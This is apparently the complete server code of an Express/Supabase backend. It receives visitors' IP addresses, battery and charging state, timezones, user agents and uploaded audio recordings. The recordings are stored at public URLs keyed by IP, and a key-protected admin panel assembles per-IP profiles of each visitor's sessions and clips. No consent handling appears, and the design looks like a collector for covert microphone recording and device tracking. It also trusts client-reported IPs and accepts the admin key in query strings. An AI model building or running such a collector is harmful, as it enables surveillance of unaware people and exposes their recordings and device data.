import express from 'express';
import cors from 'cors';
import multer from 'multer';
import { createClient } from '@supabase/supabase-js';

// =========================================================================
// CONFIG
// =========================================================================
const PORT = process.env.PORT || 5000;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const ADMIN_KEY = process.env.ADMIN_KEY;   // ← required for /api/admin/*

if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.error('❌ Missing SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY env vars');
  process.exit(1);
}
if (!ADMIN_KEY) {
  console.warn('⚠️  ADMIN_KEY env var not set — admin routes will be locked');
}

// Supabase admin client (service_role → bypasses RLS)
const supabaseAdmin = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
  auth: { persistSession: false, autoRefreshToken: false },
});

const app = express();

// =========================================================================
// MIDDLEWARE
// =========================================================================
app.use(express.json({ limit: '10mb' }));

// CORS — allowed frontend / admin origins
const allowedOrigins = [
  'https://default.nfy.fyi',                  // ← your new frontend
  'https://default-github-io.onrender.com',   // ← previous frontend (kept as fallback)
  // 'https://your-admin-domain.com',         // add more if needed
];
app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);   // Postman / mobile / curl
    if (allowedOrigins.indexOf(origin) === -1) {
      return callback(new Error('CORS not allowed'), false);
    }
    return callback(null, true);
  },
  credentials: true,
  allowedHeaders: ['Content-Type', 'x-admin-key'],   // needed for admin panel
}));

// Multer → memory storage so we can stream directly to Supabase
const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 2 * 1024 * 1024 },   // 2 MB — matches frontend MFS
});

// =========================================================================
// HELPERS
// =========================================================================
const getClientIp = (req) => {
  const forwarded = req.headers['x-forwarded-for'];
  return forwarded ? forwarded.split(',')[0].trim() : req.socket.remoteAddress;
};

// =========================================================================
// PUBLIC ROUTES
// =========================================================================

// Health check (Render pings this)
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// 1. Session report → IP + battery + time
app.post('/api/session', async (req, res) => {
  try {
    const clientIp = getClientIp(req);
    const { battery, charging, time, tz, ua, ip: reportedIp } = req.body;
    const finalIp = reportedIp || clientIp;

    const { data, error } = await supabaseAdmin
      .from('sessions')
      .insert([{
        ip_address:    finalIp,
        battery_level: battery,
        is_charging:   charging,
        captured_at:   time || new Date().toISOString(),
        timezone:      tz,
        user_agent:    ua,
      }])
      .select();

    if (error) throw error;

    console.log(`[Session] Saved for IP: ${finalIp}`);
    res.status(201).json({ success: true, id: data[0].id });
  } catch (err) {
    console.error('[Session Error]', err.message);
    res.status(500).json({ error: 'Failed to save session data' });
  }
});

// 2. Audio upload → Supabase Storage + metadata row
app.post('/api/audio', upload.single('file'), async (req, res) => {
  try {
    if (!req.file) {
      return res.status(400).json({ error: 'No audio file provided' });
    }

    const clientIp = getClientIp(req);
    const { time, ip: reportedIp } = req.body;
    const finalIp = reportedIp || clientIp;
    const timestamp = time || new Date().toISOString();
    const fileName = `${finalIp}/${Date.now()}_${crypto.randomUUID()}.webm`;

    // 1. Upload to Supabase Storage
    const { data: storageData, error: storageError } = await supabaseAdmin.storage
      .from('audio-clips')
      .upload(fileName, req.file.buffer, {
        contentType: req.file.mimetype,
        cacheControl: '3600',
        upsert: false,
      });

    if (storageError) throw storageError;

    // 2. Public URL
    const { data: urlData } = supabaseAdmin.storage
      .from('audio-clips')
      .getPublicUrl(fileName);

    // 3. Metadata row
    const { data: dbData, error: dbError } = await supabaseAdmin
      .from('audio_clips')
      .insert([{
        ip_address:   finalIp,
        file_path:    storageData.path,
        public_url:   urlData.publicUrl,
        captured_at:  timestamp,
        size_bytes:   req.file.size,
        mime_type:    req.file.mimetype,
      }])
      .select();

    if (dbError) throw dbError;

    console.log(`[Audio] Uploaded ${req.file.size} bytes for IP: ${finalIp}`);
    res.status(201).json({
      success: true,
      id: dbData[0].id,
      url: urlData.publicUrl,
    });
  } catch (err) {
    console.error('[Upload Error]', err.message);
    if (err.code === 'LIMIT_FILE_SIZE') {
      return res.status(413).json({ error: 'File too large. Max 2MB.' });
    }
    res.status(500).json({ error: 'Failed to upload audio' });
  }
});

// =========================================================================
// ADMIN ROUTES — protected by x-admin-key header
// =========================================================================
const adminAuth = (req, res, next) => {
  const key = req.headers['x-admin-key'] || req.query.key;
  if (!ADMIN_KEY || key !== ADMIN_KEY) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
};

// 1. Summary stats
app.get('/api/admin/stats', adminAuth, async (req, res) => {
  try {
    const [sessCount, clipCount, sessRows, clipRows] = await Promise.all([
      supabaseAdmin.from('sessions').select('*', { count: 'exact', head: true }),
      supabaseAdmin.from('audio_clips').select('*', { count: 'exact', head: true }),
      supabaseAdmin.from('sessions').select('ip_address'),
      supabaseAdmin.from('audio_clips').select('size_bytes'),
    ]);

    const uniqueIps  = new Set((sessRows.data || []).map(r => r.ip_address)).size;
    const totalBytes = (clipRows.data || []).reduce((a, r) => a + (r.size_bytes || 0), 0);

    res.json({
      sessions:  sessCount.count || 0,
      clips:     clipCount.count || 0,
      uniqueIps,
      totalBytes,
    });
  } catch (e) {
    console.error('[admin/stats]', e);
    res.status(500).json({ error: e.message });
  }
});

// 2. All IPs grouped with sessions + clips
app.get('/api/admin/ips', adminAuth, async (req, res) => {
  try {
    const [sessRes, clipRes] = await Promise.all([
      supabaseAdmin.from('sessions').select('*').order('captured_at', { ascending: false }),
      supabaseAdmin.from('audio_clips').select('*').order('captured_at', { ascending: false }),
    ]);

    const map = new Map();
    const ensure = (ip) => {
      if (!map.has(ip)) {
        map.set(ip, {
          ip, sessions: [], clips: [],
          lastSeen: null, firstSeen: null,
          battery: null, charging: null,
          ua: null, tz: null,
          clipCount: 0, totalBytes: 0,
        });
      }
      return map.get(ip);
    };

    (sessRes.data || []).forEach(s => {
      const g = ensure(s.ip_address);
      g.sessions.push(s);
      if (!g.lastSeen || s.captured_at > g.lastSeen) {
        g.lastSeen  = s.captured_at;
        g.battery   = s.battery_level;
        g.charging  = s.is_charging;
        g.ua        = s.user_agent;
        g.tz        = s.timezone;
      }
      if (!g.firstSeen || s.captured_at < g.firstSeen) g.firstSeen = s.captured_at;
    });

    (clipRes.data || []).forEach(c => {
      const g = ensure(c.ip_address);
      g.clips.push(c);
      g.clipCount++;
      g.totalBytes += (c.size_bytes || 0);
      if (!g.lastSeen || c.captured_at > g.lastSeen) g.lastSeen = c.captured_at;
    });

    res.json({ ips: Array.from(map.values()) });
  } catch (e) {
    console.error('[admin/ips]', e);
    res.status(500).json({ error: e.message });
  }
});

// 3. Single IP detail (sessions + clips)
app.get('/api/admin/ip/:ip', adminAuth, async (req, res) => {
  try {
    const { ip } = req.params;
    const [sessRes, clipRes] = await Promise.all([
      supabaseAdmin.from('sessions').select('*').eq('ip_address', ip).order('captured_at', { ascending: false }),
      supabaseAdmin.from('audio_clips').select('*').eq('ip_address', ip).order('captured_at', { ascending: false }),
    ]);
    res.json({ ip, sessions: sessRes.data || [], clips: clipRes.data || [] });
  } catch (e) {
    console.error('[admin/ip]', e);
    res.status(500).json({ error: e.message });
  }
});

// =========================================================================
// ERROR HANDLING
// =========================================================================
app.use((err, req, res, next) => {
  if (err instanceof multer.MulterError) {
    return res.status(400).json({ error: err.message });
  }
  console.error('[Global Error]', err);
  res.status(500).json({ error: 'Internal Server Error' });
});

// =========================================================================
// START
// =========================================================================
app.listen(PORT, () => {
  console.log(`✅ Backend running on port ${PORT}`);
  console.log(`   Admin routes: ${ADMIN_KEY ? 'enabled' : '⚠️  DISABLED (no ADMIN_KEY)'}`);
});
